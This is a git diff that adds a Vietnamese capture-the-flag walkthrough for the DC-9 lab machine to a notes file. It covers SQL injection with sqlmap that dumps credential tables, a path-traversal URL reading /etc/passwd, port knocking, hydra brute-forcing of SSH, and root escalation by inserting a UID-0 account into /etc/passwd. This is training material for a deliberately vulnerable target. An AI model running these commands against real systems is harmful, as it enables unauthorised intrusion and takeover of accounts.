@@ -2348,7 +2348,7 @@ Vi còn cron này được lên lịch cứ 15p thì sẽ thực hiện chạy b
 
 ![alt text](IMG/DC-7/image-24.png)
 
-# DC8
+# DC-8
 
 ## RECON 
 
@@ -2649,3 +2649,341 @@ chmod +x 46996.sh
 ![alt text](IMG/DC-8/image-16.png)
 
 ![alt text](IMG/DC-8/image-17.png)
+
+# DC-9
+
+## RECON
+
+```BASH
+arp-scan -l
+```
+
+![alt text](IMG/DC-9/image.png)
+
+![alt text](IMG/DC-9/image-1.png)
+
+Tại đây ssh có bị filtered.
+
+![alt text](IMG/DC-9/image-2.png)
+
+![alt text](IMG/DC-9/image-3.png)
+
+Giao diện của trang web:
+
+![alt text](IMG/DC-9/image-4.png)
+
+## SQLMAP
+
+Có 3 trang là home, display all record và search: trang `display all record` sẽ hiện tất cả các ban ghi, trang `search` sẽ search những thông tin của bản ghi mà người dùng nhập vào. Ta nhận thấy trang `search` có bị dính `SQL Injection`:
+
+![alt text](IMG/DC-9/image-5.png)
+
+![alt text](IMG/DC-9/image-6.png)
+
+Ta set foxy proxy cho máy:
+
+![alt text](IMG/DC-9/image-7.png)
+
+
+bật burp để bắt được gói tin của trang web trên, ta sẽ search tên `mary` rùi thực hiện bắt lại gói tin ở search và thực hiện lưu lại request đó:
+
+![alt text](IMG/DC-9/image-9.png)
+
+![alt text](IMG/DC-9/image-10.png)
+
+Tệp file này cho chúng ta biết răng có lỗ hổng SQL Injection, vì vậy chúng ta sử dụng công cụ SQLmap. sqlmap dùng nội dung request trong file check.txt để kiểm tra SQL Injection và liệt kê các database có trên hệ quản trị CSDL.
+
+```bash
+sqlmap -r check.txt --dbs
+```
+
+Như vậy chúng ta thông tin của các database như: user, staff.
+
+![alt text](IMG/DC-9/image-11.png)
+
+liệt kê các bảng trong database Staff.
+
+```bash
+sqlmap -r check.txt -D Staff --tables
+```
+
+![alt text](IMG/DC-9/image-12.png)
+
+Chọn bảng StaffDetails, rồi liệt kê các cột của bảng đó:
+
+```bash
+sqlmap -r check.txt -D Staff -T StaffDetails --columns
+```
+
+![alt text](IMG/DC-9/image-13.png)
+
+Ta thấy các thông tin ở đây chưa có gì hữu ích cho chúng ta nên bây giờ chúng ta xem nốt của bảng user trong database Staff:
+
+```bash
+sqlmap -r check.txt -D Staff -T Users --columns
+```
+
+![alt text](IMG/DC-9/image-14.png)
+
+Liệt kê cột username và password của bảng Users trong database Staff:
+
+```bash
+sqlmap -r check.txt -D Staff -T Users -C username,password --dump
+```
+
+![alt text](IMG/DC-9/image-15.png)
+
+Như vậy ta có mật khẩu dạng hash của admin:
+
+```bash
+admin | 856f5de590ef37314e7c3bdf6f8a66dc
+```
+
+Ta lên trang web [này](https://crackstation.net/) để thực hiện crack mật khẩu. Kết qua thu được như sau:
+
+![alt text](IMG/DC-9/image-16.png)
+
+```bash
+admin | transorbital1
+```
+
+Lúc này ta đăng nhập vào mục manager của trang web:
+
+![alt text](IMG/DC-9/image-17.png)
+
+nó hiện rằng hiện tại không có file nào tôn tại và chúng ta có thêm chức năng add record dành cho admin.
+
+Trước khi bắt đầu tiếp chúng ta hãy xem nốt về database của user, nãy chúng ta mới chỉ xem của Staff.
+
+```bash
+sqlmap -r check.txt -D users --tables
+```
+
+![alt text](IMG/DC-9/image-18.png)
+
+```bash
+sqlmap -r check.txt -D users -T UserDetails --columns
+```
+
+![alt text](IMG/DC-9/image-19.png)
+
+```bash
+sqlmap -r check.txt -D users -T UserDetails -C username,password --dump
+```
+
+![alt text](IMG/DC-9/image-20.png)
+
+Như vậy chúng ta có list password:
+
+```txt
+admin - transorbital1
+marym - 3kfs86sfd
+julied - 468sfdfsd2
+fredf - 4sfd87sfd1
+barneyr - RocksOff
+tomc - TC&TheBoyz
+jerrym - B8m#48sd
+wilmaf - Pebbles
+bettyr - BamBam01
+chandlerb - UrAG0D!
+joeyt - Passw0rd
+rachelg - yN72#dsd
+rossg - ILoveRachel
+monicag - 3248dsds7s
+phoebeb - smellycats
+scoots - YR3BVxxxw87
+janitor - Ilovepeepee
+janitor2 - Hawaii-Five
+```
+
+## LFI
+
+Quay lại với trang web chính ta thấy có thông báo: `File does not exist`, rất có khả năng cao hệ thống sẽ bị dính lỗi LFI (Local File Inclusion).
+
+![alt text](IMG/DC-9/image-21.png)
+
+Chúng ta thư truy cập URL sau:
+
+```bash
+http://172.16.1.134/manage.php?file=../../../../../../etc/passwd
+```
+
+![alt text](IMG/DC-9/image-22.png)
+
+Như vậy chúng ta chắc chắn 100% có bị dính LFI. Và chúng ta nhớ là ssh không dùng được vì đã bị filtered.
+
+```bash
+http://172.16.1.134/manage.php?file=../../../../../../etc/knockd.conf
+```
+
+`/etc/knockd.conf` là file cấu hình của dịch vụ knockd trên Linux. Nó thường dùng cho port knocking — tức là phải “gõ cửa” đúng chuỗi cổng thì firewall mới mở cổng thật sự, ví dụ SSH.
+
+![alt text](IMG/DC-9/image-23.png)
+
+Bây giờ chúng ta sử dụng công cụ `knock` để thực hiện gõ cửa đê được mở cổng kết nối ssh tạm thời. Dựa vào thông tin trên ta có được sequence là `7469,8475,9842`.
+
+![alt text](IMG/DC-9/image-24.png)
+
+Ta thấy TCP 3 lần, vì vạy chúng ta đã gõ công thành công. Như vậy chúng ta đã có thể mở ssh được rùi, bây giờ chúng ta thực hiện nmap lại:
+
+```bash
+nmap -sV 172.16.1.134
+```
+
+![alt text](IMG/DC-9/image-25.png)
+
+## SSH
+
+Bây giờ chúng ta đã có thê kết nối ssh được, lúc này chúng ta sử dụng hgydra để xem người dùng nào ssh vào được hệ thống.
+
+```bash
+# user
+admin
+marym
+julied
+fredf
+barneyr
+tomc
+jerrym
+wilmaf
+bettyr
+chandlerb
+joeyt
+rachelg
+rossg
+monicag
+phoebeb
+scoots
+janitor
+janitor2
+```
+
+```bash
+# pass
+
+transorbital1
+3kfs86sfd
+468sfdfsd2
+4sfd87sfd1
+RocksOff
+TC&TheBoyz
+B8m#48sd
+Pebbles
+BamBam01
+UrAG0D!
+Passw0rd
+yN72#dsd
+ILoveRachel
+3248dsds7s
+smellycats
+YR3BVxxxw87
+Ilovepeepee
+Hawaii-Five
+```
+
+```bash
+hydra -L user.txt -P pass.txt 172.16.1.134 ssh
+```
+
+![alt text](IMG/DC-9/image-26.png)
+
+Như vậy chúng ta có 3 user như trên:
+
+```bash
+chandlerb | UrAG0D!
+
+joeyt | Passw0rd
+
+janitor | Ilovepeepee
+```
+
+Của người dùng `chandlerb`:
+
+![alt text](IMG/DC-9/image-27.png)
+
+Người dùng `joeyt`:
+
+![alt text](IMG/DC-9/image-28.png)
+
+Người dùng `janitor`:
+
+![alt text](IMG/DC-9/image-29.png)
+
+Với người dùng `janitor` ta thấy có một thư mục bí mật có vẻ chứa thông tin nhạy cảm là `.secrets-for-putin`:
+
+![alt text](IMG/DC-9/image-30.png)
+
+Đến đây ta lại thu được mật khẩu nữa:
+
+````bash
+BamBam01
+Passw0rd
+smellycats
+P0Lic#10-4
+B4-Tru3-001
+4uGU5T-NiGHts
+````
+
+Ta thử sudo -l thì thấy người dùng này không có quyền chạy được trên `dc-9`.
+
+![alt text](IMG/DC-9/image-31.png)
+
+do chúng ta có thêm mật khẩu nên chúng ta thử quét lại một lần nữa xem có thêm tài khoản nào không:
+
+```bash
+hydra -L user.txt -P pass.txt 172.16.1.134 ssh
+```
+
+Như vậy ta quét thêm được 1 user nữa là `fredf`:
+
+![alt text](IMG/DC-9/image-32.png)
+
+```bash
+chandlerb | UrAG0D!
+
+joeyt | Passw0rd
+
+janitor | Ilovepeepee
+
+fredf | B4-Tru3-001
+```
+
+Ta thực hiện ssh bằng user đó:
+
+```bash
+ssh fredf@172.16.1.134
+```
+
+hehe lúc này thì chúng ta đã có quyền `sudo -l` của user này, và câu lệnh mà user này có thê thực thi dưới quyền root mà không hỏi mật khẩu chính là lệnh test:
+
+![alt text](IMG/DC-9/image-33.png)
+
+## ROOT FLAG
+
+Chúng ta có thê đọc được `/etc/passwd`. Vì ở đây chúng ta có thê biết được rằng chúng ta có thực thi lệnh `test` dưới quyền root cho tất cả. Bây giờ ta sẽ tạo người dùng hacker trong ect/passwd bằng việc sư dụng tập tin thực thi `test`. Trước tiên ta cần tạo 1 tài khoản hacker:
+
+```bash
+hacker:x:0:0:root:/root:/bin/bash
+```
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ openssl passwd -1 hack
+$1$XOyMD9PM$hjmiQHN9ro0pS.ZToUk30/
+```
+
+```bash
+hacker:$1$XOyMD9PM$hjmiQHN9ro0pS.ZToUk30/:0:0:arun:/home/root:/bin/bash
+```
+
+
+```bash
+nano /tmp/tung
+# hacker:$1$XOyMD9PM$hjmiQHN9ro0pS.ZToUk30/:0:0:arun:/home/root:/bin/bash
+sudo ./test /tmp/tung /etc/passwd
+cat /etc/passwd
+```
+
+![alt text](IMG/DC-9/image-34.png)
+
+![alt text](IMG/DC-9/image-35.png)
